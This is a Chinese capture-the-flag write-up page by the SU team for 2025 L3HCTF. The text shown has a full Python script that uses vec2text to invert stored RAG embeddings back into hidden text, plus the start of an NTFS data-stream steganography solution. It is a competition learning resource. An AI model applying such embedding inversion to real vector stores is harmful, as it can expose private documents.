<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2025 L3HCTF SU WriteUp - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="感谢 L3H_Sec 的师傅们精心准备的比赛！本次L3HCTF我们 SU 取得了第一名🏆 的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。 以下是我们 SU 本次 2025 L3HCTF的 WriteUp。"><meta property="og:type" content="blog"><meta property="og:title" content="2025 L3HCTF SU WriteUp"><meta property="og:url" content="https://team-su.github.io/posts/e3fd1be7.html"><meta property="og:site_name" content="su-team"><meta property="og:description" content="感谢 L3H_Sec 的师傅们精心准备的比赛！本次L3HCTF我们 SU 取得了第一名🏆 的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。 以下是我们 SU 本次 2025 L3HCTF的 WriteUp。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/1.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/78cfb26b-4720-4e2a-85ae-2f2468d2394d.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/11994d42-4157-47a8-af08-0e0f8783a497.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/dbaa88a4-49fe-46ba-b209-f25d43fd9476.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/1daa888b-d0cc-4a51-bef2-d6d262291ac5.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/321aeec8-1d5b-442a-acf6-bc4b3aa0e76c.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/935d47d1-f07f-4cf2-b9c3-d8c8025d9b4f.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/062d6937-e725-4a9c-9c29-a35978a11797.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/4366a723-310c-48c4-8277-4e6795d49a10.jpg"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/305f380b-1cef-4381-a515-c87183afa9ca.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/c234ae48-7282-4de3-b6d4-62eac05daa20.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/18785a00-1b8d-4bee-b00e-6482c66d9702.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/2e309494-31a1-4e2c-ad39-baa4c1c43b5f.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/41aecc71-b7f7-4182-9795-cacd56335a56.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/6e0f3c45-7240-4149-b3a8-30ea3e563a7b.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/50758324-d972-4025-a866-3e94ef0718a1.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/d2feac3a-b04a-4cbb-9a31-0567507cfbc7.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/228a2243-d2e9-4304-9c4d-468c5e905c71.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/af08c65a-59dc-4dd2-9dd5-34334b129146.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/20a51efc-3408-4c46-9a70-ee322c047832.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/f6b72b2a-24d7-410d-8366-6e77e42b067d.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/64b86e56-6d44-4532-8aa1-f2f91eeae5c5.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/c12f8782-5fe4-424c-b894-162e22a108cb.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/58ce9bd7-c3a4-402c-9cf4-f51a6c49a316.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/f51300e2-7447-483a-a66e-0b2dbdeb182a.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/80313d59-c466-4877-9542-8f492b4c9f7b.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/5f8b27e1-24a3-4b12-a436-64107531231c.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/95170242-6afe-45d8-b014-f86259b1d996.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/1e48b496-9f7e-4a88-922c-755b8c8d24d3.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/628e4417-4507-45a2-ba52-5ecf38f1a415.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/db43b021-3df5-48ca-ab97-3edb5efa1554.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/b12e1317-4812-4bdc-a518-fe2dbb461620.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/9171acd8-b3f4-489e-b563-975875b31e8c.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/120aaaf1-4c0c-4433-b770-fbd9cab49792.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/b498a370-9988-401a-af1e-bb924e26edaf.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/f4783aca-b0da-44ae-bf1d-03e9a30c2376.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/cf40c0f2-9dc4-4485-8502-4a4f93873567.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/721c13ef-3482-4f76-8952-e88da3af6942.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/f8b016e5-af45-4709-afb9-0e7f58f07253.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/d02f74b8-7ad3-4ee5-9c32-6eda99684bb9.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/60c3e82d-beab-42dd-9013-49cd331d2be9.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/c791a1be-391d-4aee-b9f9-cf64a21a4e07.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/bb28e8da-4dc7-47cf-8b32-8592c4b3a480.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/5812720d-b529-4f96-aafe-7e0d8cbe1886.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/b7c5cc65-9a4c-4cb4-bd57-62043378d1d0.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/98825187-3d59-41fd-868c-d4f0302bfbfb.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/37f4d4a8-4137-41c3-9f7e-9e267ccf77f8.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/51398f3e-a91b-4a54-9d51-cfab38c5262b.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/d816f7ca-643c-4f63-b6cb-8ed52f2484d4.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/288ea616-82c6-470a-9528-e9670fd33236.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/d177101f-3d17-4d53-9632-214263c460a8.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/07e49080-a9a6-4610-a379-67b43ef2f18b.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/07094fcd-700d-482b-88f7-0fe500c2f99f.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/aa76fbd0-1b5c-466b-a845-c38381792c2d.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/bb76d5e7-ac4a-4333-9688-3c1494ba32ee.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/31bdd8d6-7c8a-4c5a-9356-0beeedc18a8c.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/693c8005-17a5-433c-b432-28caf1e7c6f5.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/d77fb7fe-c1e2-4de5-808c-5fe34a69a30a.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/0d441f67-7f39-4616-8f27-a5d96d9713d0.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/9bc8087e-e4a6-4361-a60e-0b15de4b2c6c.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/55d7f1b7-5096-42cb-ba13-a1ad0fd127ef.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/d7301785-2a38-426f-a78d-fc411ce3be78.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/e70cbba8-2e31-413e-89a9-00a9342f6c42.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/711fc631-ad5b-42e9-b0cc-837a046e84d1.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/dec030ad-b986-482e-86f3-aa899ffd8cfa.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/8564e85a-08de-48c4-bf7a-6e49ce112132.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/9b171591-f889-413c-9bf8-ce93a93bc9b6.png"><meta property="og:image" content="https://team-su.github.io/images/2025-L3HCTF/fb9ce8e3-89fe-43ee-9c6c-9fec648d4276.png"><meta property="article:published_time" content="2025-07-13T12:21:10.000Z"><meta property="article:modified_time" content="2025-07-15T00:05:37.767Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="L3HCTF"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/images/2025-L3HCTF/1.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/posts/e3fd1be7.html"},"headline":"2025 L3HCTF SU WriteUp","image":["https://team-su.github.io/images/2025-L3HCTF/1.png","https://team-su.github.io/images/2025-L3HCTF/78cfb26b-4720-4e2a-85ae-2f2468d2394d.png","https://team-su.github.io/images/2025-L3HCTF/11994d42-4157-47a8-af08-0e0f8783a497.png","https://team-su.github.io/images/2025-L3HCTF/dbaa88a4-49fe-46ba-b209-f25d43fd9476.png","https://team-su.github.io/images/2025-L3HCTF/1daa888b-d0cc-4a51-bef2-d6d262291ac5.png","https://team-su.github.io/images/2025-L3HCTF/321aeec8-1d5b-442a-acf6-bc4b3aa0e76c.png","https://team-su.github.io/images/2025-L3HCTF/935d47d1-f07f-4cf2-b9c3-d8c8025d9b4f.png","https://team-su.github.io/images/2025-L3HCTF/062d6937-e725-4a9c-9c29-a35978a11797.png","https://team-su.github.io/images/2025-L3HCTF/4366a723-310c-48c4-8277-4e6795d49a10.jpg","https://team-su.github.io/images/2025-L3HCTF/305f380b-1cef-4381-a515-c87183afa9ca.png","https://team-su.github.io/images/2025-L3HCTF/c234ae48-7282-4de3-b6d4-62eac05daa20.png","https://team-su.github.io/images/2025-L3HCTF/18785a00-1b8d-4bee-b00e-6482c66d9702.png","https://team-su.github.io/images/2025-L3HCTF/2e309494-31a1-4e2c-ad39-baa4c1c43b5f.png","https://team-su.github.io/images/2025-L3HCTF/41aecc71-b7f7-4182-9795-cacd56335a56.png","https://team-su.github.io/images/2025-L3HCTF/6e0f3c45-7240-4149-b3a8-30ea3e563a7b.png","https://team-su.github.io/images/2025-L3HCTF/50758324-d972-4025-a866-3e94ef0718a1.png","https://team-su.github.io/images/2025-L3HCTF/d2feac3a-b04a-4cbb-9a31-0567507cfbc7.png","https://team-su.github.io/images/2025-L3HCTF/228a2243-d2e9-4304-9c4d-468c5e905c71.png","https://team-su.github.io/images/2025-L3HCTF/af08c65a-59dc-4dd2-9dd5-34334b129146.png","https://team-su.github.io/images/2025-L3HCTF/20a51efc-3408-4c46-9a70-ee322c047832.png","https://team-su.github.io/images/2025-L3HCTF/f6b72b2a-24d7-410d-8366-6e77e42b067d.png","https://team-su.github.io/images/2025-L3HCTF/64b86e56-6d44-4532-8aa1-f2f91eeae5c5.png","https://team-su.github.io/images/2025-L3HCTF/c12f8782-5fe4-424c-b894-162e22a108cb.png","https://team-su.github.io/images/2025-L3HCTF/58ce9bd7-c3a4-402c-9cf4-f51a6c49a316.png","https://team-su.github.io/images/2025-L3HCTF/f51300e2-7447-483a-a66e-0b2dbdeb182a.png","https://team-su.github.io/images/2025-L3HCTF/80313d59-c466-4877-9542-8f492b4c9f7b.png","https://team-su.github.io/images/2025-L3HCTF/5f8b27e1-24a3-4b12-a436-64107531231c.png","https://team-su.github.io/images/2025-L3HCTF/95170242-6afe-45d8-b014-f86259b1d996.png","https://team-su.github.io/images/2025-L3HCTF/1e48b496-9f7e-4a88-922c-755b8c8d24d3.png","https://team-su.github.io/images/2025-L3HCTF/628e4417-4507-45a2-ba52-5ecf38f1a415.png","https://team-su.github.io/images/2025-L3HCTF/db43b021-3df5-48ca-ab97-3edb5efa1554.png","https://team-su.github.io/images/2025-L3HCTF/b12e1317-4812-4bdc-a518-fe2dbb461620.png","https://team-su.github.io/images/2025-L3HCTF/9171acd8-b3f4-489e-b563-975875b31e8c.png","https://team-su.github.io/images/2025-L3HCTF/120aaaf1-4c0c-4433-b770-fbd9cab49792.png","https://team-su.github.io/images/2025-L3HCTF/b498a370-9988-401a-af1e-bb924e26edaf.png","https://team-su.github.io/images/2025-L3HCTF/f4783aca-b0da-44ae-bf1d-03e9a30c2376.png","https://team-su.github.io/images/2025-L3HCTF/cf40c0f2-9dc4-4485-8502-4a4f93873567.png","https://team-su.github.io/images/2025-L3HCTF/721c13ef-3482-4f76-8952-e88da3af6942.png","https://team-su.github.io/images/2025-L3HCTF/f8b016e5-af45-4709-afb9-0e7f58f07253.png","https://team-su.github.io/images/2025-L3HCTF/d02f74b8-7ad3-4ee5-9c32-6eda99684bb9.png","https://team-su.github.io/images/2025-L3HCTF/60c3e82d-beab-42dd-9013-49cd331d2be9.png","https://team-su.github.io/images/2025-L3HCTF/c791a1be-391d-4aee-b9f9-cf64a21a4e07.png","https://team-su.github.io/images/2025-L3HCTF/bb28e8da-4dc7-47cf-8b32-8592c4b3a480.png","https://team-su.github.io/images/2025-L3HCTF/5812720d-b529-4f96-aafe-7e0d8cbe1886.png","https://team-su.github.io/images/2025-L3HCTF/b7c5cc65-9a4c-4cb4-bd57-62043378d1d0.png","https://team-su.github.io/images/2025-L3HCTF/98825187-3d59-41fd-868c-d4f0302bfbfb.png","https://team-su.github.io/images/2025-L3HCTF/37f4d4a8-4137-41c3-9f7e-9e267ccf77f8.png","https://team-su.github.io/images/2025-L3HCTF/51398f3e-a91b-4a54-9d51-cfab38c5262b.png","https://team-su.github.io/images/2025-L3HCTF/d816f7ca-643c-4f63-b6cb-8ed52f2484d4.png","https://team-su.github.io/images/2025-L3HCTF/288ea616-82c6-470a-9528-e9670fd33236.png","https://team-su.github.io/images/2025-L3HCTF/d177101f-3d17-4d53-9632-214263c460a8.png","https://team-su.github.io/images/2025-L3HCTF/07e49080-a9a6-4610-a379-67b43ef2f18b.png","https://team-su.github.io/images/2025-L3HCTF/07094fcd-700d-482b-88f7-0fe500c2f99f.png","https://team-su.github.io/images/2025-L3HCTF/aa76fbd0-1b5c-466b-a845-c38381792c2d.png","https://team-su.github.io/images/2025-L3HCTF/bb76d5e7-ac4a-4333-9688-3c1494ba32ee.png","https://team-su.github.io/images/2025-L3HCTF/31bdd8d6-7c8a-4c5a-9356-0beeedc18a8c.png","https://team-su.github.io/images/2025-L3HCTF/693c8005-17a5-433c-b432-28caf1e7c6f5.png","https://team-su.github.io/images/2025-L3HCTF/d77fb7fe-c1e2-4de5-808c-5fe34a69a30a.png","https://team-su.github.io/images/2025-L3HCTF/0d441f67-7f39-4616-8f27-a5d96d9713d0.png","https://team-su.github.io/images/2025-L3HCTF/9bc8087e-e4a6-4361-a60e-0b15de4b2c6c.png","https://team-su.github.io/images/2025-L3HCTF/55d7f1b7-5096-42cb-ba13-a1ad0fd127ef.png","https://team-su.github.io/images/2025-L3HCTF/d7301785-2a38-426f-a78d-fc411ce3be78.png","https://team-su.github.io/images/2025-L3HCTF/e70cbba8-2e31-413e-89a9-00a9342f6c42.png","https://team-su.github.io/images/2025-L3HCTF/711fc631-ad5b-42e9-b0cc-837a046e84d1.png","https://team-su.github.io/images/2025-L3HCTF/dec030ad-b986-482e-86f3-aa899ffd8cfa.png","https://team-su.github.io/images/2025-L3HCTF/8564e85a-08de-48c4-bf7a-6e49ce112132.png","https://team-su.github.io/images/2025-L3HCTF/9b171591-f889-413c-9bf8-ce93a93bc9b6.png","https://team-su.github.io/images/2025-L3HCTF/fb9ce8e3-89fe-43ee-9c6c-9fec648d4276.png"],"datePublished":"2025-07-13T12:21:10.000Z","dateModified":"2025-07-15T00:05:37.767Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"感谢 L3H_Sec 的师傅们精心准备的比赛！本次L3HCTF我们 SU 取得了第一名🏆 的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。 以下是我们 SU 本次 2025 L3HCTF的 WriteUp。"}</script><link rel="canonical" href="https://team-su.github.io/posts/e3fd1be7.html"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a><a class="navbar-item" href="https://forms.office.com/r/YxbUJJ3i78">Join</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="RSS Feed" href="/atom.xml"><i class="fas fa-rss"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2025-07-13T12:21:10.000Z" title="2025/7/13 20:21:10">2025-07-13</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-07-15T00:05:37.767Z" title="2025/7/15 08:05:37">2025-07-15</time></span><span class="level-item">3 hours read (About 24023 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">2025 L3HCTF SU WriteUp</h1><div class="content"><p>感谢 L3H_Sec 的师傅们精心准备的比赛！本次L3HCTF我们 SU 取得了第一名🏆 的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：<a href="mailto:&#115;&#117;&#x65;&#x72;&#x73;&#x5f;&#120;&#x63;&#116;&#102;&#x40;&#x31;&#50;&#54;&#x2e;&#x63;&#111;&#x6d;">suers_xctf@126.com</a> 或者直接联系baozongwi QQ:2405758945。</p>
<p>以下是我们 SU 本次 2025 L3HCTF的 WriteUp。</p>
<span id="more"></span>

<hr>
<p><img src="../images/2025-L3HCTF/1.png" alt="img"></p>
<p>感谢 L3H_Sec 的师傅们精心准备的比赛！本次L3HCTF我们 SU 取得了第一名🏆 的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：<a href="mailto:&#x73;&#117;&#x65;&#114;&#x73;&#x5f;&#x78;&#99;&#116;&#x66;&#x40;&#49;&#50;&#x36;&#x2e;&#x63;&#x6f;&#x6d;">suers_xctf@126.com</a> 或者直接联系baozongwi QQ:2405758945。</p>
<p>以下是我们 SU 本次 2025 L3HCTF的 WriteUp。</p>
<div class="toc">

<!-- toc -->

<ul>
<li><a href="#misc">Misc</a><ul>
<li><a href="#learnrag">LearnRag</a></li>
<li><a href="#liang-zi-shuang-sheng-ying">量子双生影</a></li>
<li><a href="#please-sign-in">Please Sign In</a></li>
<li><a href="#paperback">PaperBack</a></li>
<li><a href="#why-not-read-it-out">Why not read it out?</a></li>
</ul>
</li>
<li><a href="#web">Web</a><ul>
<li><a href="#sai-bo-zhen-tan">赛博侦探</a></li>
<li><a href="#gogogo-chu-fa-lou">gogogo出发喽</a></li>
<li><a href="#best-profile"><strong>best_profile</strong></a></li>
<li><a href="#gateway-advance">gateway_advance</a></li>
<li><a href="#tellmewhy">Tellmewhy</a></li>
<li><a href="#lookingmyeyes">LookingMyEyes</a></li>
</ul>
</li>
<li><a href="#reverse">Reverse</a><ul>
<li><a href="#temporalparadox">TemporalParadox</a></li>
<li><a href="#ez-android">ez_android</a></li>
<li><a href="#zhong-yan-zhi-men">终焉之门</a></li>
<li><a href="#obfuscate">obfuscate</a></li>
<li><a href="#easyvm">easyvm</a></li>
<li><a href="#snake">snake</a></li>
<li><a href="#awayout2">AWayOut2</a></li>
</ul>
</li>
<li><a href="#pwn">Pwn</a><ul>
<li><a href="#heack">Heack</a></li>
<li><a href="#heack-revenge">Heack_revenge</a></li>
<li><a href="#library">Library</a></li>
</ul>
</li>
<li><a href="#crypto">Crypto</a><ul>
<li><a href="#math-problem">math_problem</a></li>
<li><a href="#rrrsssaaa">RRRSSSAAA</a></li>
<li><a href="#ezecdsa">EzECDSA</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div>

<h1><span id="misc">Misc</span><a href="#misc" class="header-anchor"></a></h1><h2><span id="learnrag">LearnRag</span><a href="#learnrag" class="header-anchor"></a></h2><p><a href="https://github.com/vec2text/vec2text">https://github.com/vec2text/vec2text</a></p>
<p><a href="https://arxiv.org/html/2401.12192v4">https://arxiv.org/html/2401.12192v4</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> vec2text</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoModel, AutoTokenizer, PreTrainedTokenizer, PreTrainedModel</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RagData</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, embedding_model=<span class="literal">None</span>, embeddings=<span class="literal">None</span></span>):</span><br><span class="line">        <span class="variable language_">self</span>.embedding_model = embedding_model</span><br><span class="line">        <span class="variable language_">self</span>.embeddings = embeddings <span class="keyword">or</span> []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_gtr_embeddings</span>(<span class="params">text_list,</span></span><br><span class="line"><span class="params">                       encoder: PreTrainedModel,</span></span><br><span class="line"><span class="params">                       tokenizer: PreTrainedTokenizer</span>) -&gt; torch.Tensor:</span><br><span class="line"></span><br><span class="line">    inputs = tokenizer(text_list,</span><br><span class="line">                       return_tensors=<span class="string">&quot;pt&quot;</span>,</span><br><span class="line">                       max_length=<span class="number">128</span>,</span><br><span class="line">                       truncation=<span class="literal">True</span>,</span><br><span class="line">                       padding=<span class="string">&quot;max_length&quot;</span>,).to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> torch.no_grad():</span><br><span class="line">        model_output = encoder(input_ids=inputs[<span class="string">&#x27;input_ids&#x27;</span>], attention_mask=inputs[<span class="string">&#x27;attention_mask&#x27;</span>])</span><br><span class="line">        hidden_state = model_output.last_hidden_state</span><br><span class="line">        embeddings = vec2text.models.model_utils.mean_pool(hidden_state, inputs[<span class="string">&#x27;attention_mask&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> embeddings</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encoder = AutoModel.from_pretrained(<span class="string">&quot;sentence-transformers/gtr-t5-base&quot;</span>).encoder.to(<span class="string">&quot;cuda&quot;</span>)</span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(<span class="string">&quot;sentence-transformers/gtr-t5-base&quot;</span>)</span><br><span class="line">corrector = vec2text.load_pretrained_corrector(<span class="string">&quot;gtr-base&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;rag_data.pkl&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  rag_data = pickle.load(f)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">embeddings=rag_data.embeddings</span><br><span class="line">embeddings = torch.tensor(embeddings)</span><br><span class="line"><span class="comment"># 查看数据结构</span></span><br><span class="line"><span class="built_in">print</span>(embeddings.shape)</span><br><span class="line"></span><br><span class="line">vec2text.invert_embeddings(</span><br><span class="line">    embeddings=embeddings.cuda(),</span><br><span class="line">    corrector=corrector,</span><br><span class="line">    num_steps=<span class="number">20</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>flag出来的很乱，整理一下L3HCTF{wowthisisembedding}</p>
<h2><span id="liang-zi-shuang-sheng-ying">量子双生影</span><a href="#liang-zi-shuang-sheng-ying" class="header-anchor"></a></h2><p>ntfs数据流隐写+ai二维码变换+双图合并</p>
<p>首先给出的二维码很明显可以用<a href="https://github.com/Tokeii0/LoveLy-QRCode-Scanner">https://github.com/Tokeii0/LoveLy-QRCode-Scanner</a> 这个项目进行扫描</p>
<p>给出的提示是</p>
<p><img src="../images/2025-L3HCTF/78cfb26b-4720-4e2a-85ae-2f2468d2394d.png" alt="img"></p>
<p>分析解压出的图片很明显和压缩包大小不符合，检索考察的是ntfs数据流隐写，</p>
<p><img src="../images/2025-L3HCTF/11994d42-4157-47a8-af08-0e0f8783a497.png" alt="img"></p>
<p>解压用ntfsstreamseditor这个工具提取一下得到另外一个图片，分析发现是两个图片进行了xor用现成工具或写脚本</p>
